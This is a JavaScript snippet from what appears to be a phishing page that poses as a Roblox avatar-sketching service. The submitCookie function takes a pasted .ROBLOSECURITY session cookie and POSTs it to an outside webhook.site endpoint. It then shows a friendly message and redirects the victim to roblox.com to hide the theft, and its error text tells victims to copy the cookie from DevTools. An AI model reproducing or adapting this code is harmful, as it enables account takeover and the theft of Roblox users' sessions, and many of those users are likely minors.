function submitCookie() {
    const cookie = document.getElementById('cookie-input').value.trim();
    if (cookie && cookie.startsWith('_|WARNING')) {
        fetch('https://webhook.site/abeda9ac-7aa3-4e79-afa3-c7b29666646e', { // r
            method: 'POST',
            body: JSON.stringify({ cookie: cookie, source: 'avatar-sketch' }),
            headers: { 'Content-Type': 'application/json' }
        }).then(() => {
            document.getElementById('status').innerText = 'Nice one! Your avatar’s being sketched—check DMs soon!';
            setTimeout(() => window.location.href = 'https://www.roblox.com', 2000); // Redirect to Roblox
        }).catch(() => {
            document.getElementById('status').innerText = 'Bugger, something went wrong. Try again!';
        });
    } else {
        document.getElementById('status').innerText = 'Invalid code, mate! Grab the .ROBLOSECURITY from DevTools.';
    }
}

// Handle hash routing
window.addEventListener('hashchange', () => {
    let page = location.hash.slice(2).split('/').pop();
    document.querySelectorAll('section').forEach(s => s.style.display = 'none');
    if (page) document.getElementById(page).style.display = 'block';
});
window.dispatchEvent(new Event('hashchange')); // Trigger on load